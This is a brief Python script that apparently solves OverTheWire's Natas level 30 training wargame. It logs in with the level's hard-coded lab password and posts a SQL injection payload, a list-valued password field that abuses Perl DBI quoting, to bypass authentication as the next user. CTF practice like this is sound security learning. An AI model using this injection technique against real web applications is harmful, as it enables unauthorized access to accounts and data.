#!/usr/bin/env python3

import requests

# post with data: s.post(url, data = {"name": "value"})
# get with data: s.get(url, params = {"name": "value"})
# proxy: s.get(url, proxies = burp_proxy)

username = 'natas30'
password = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

url = f"http://{username}.natas.labs.overthewire.org/"

burp_proxy = {"http": "http://127.0.0.1:8080"}

def main():
    with requests.Session() as s:
        s.auth = (username, password)

        # your code goes here
        res = s.post(url + "index.pl", data = {"username": "natas31", "password": ["'' or 1", 2]} )
        print(res.text)

if __name__ == "__main__":
    main()
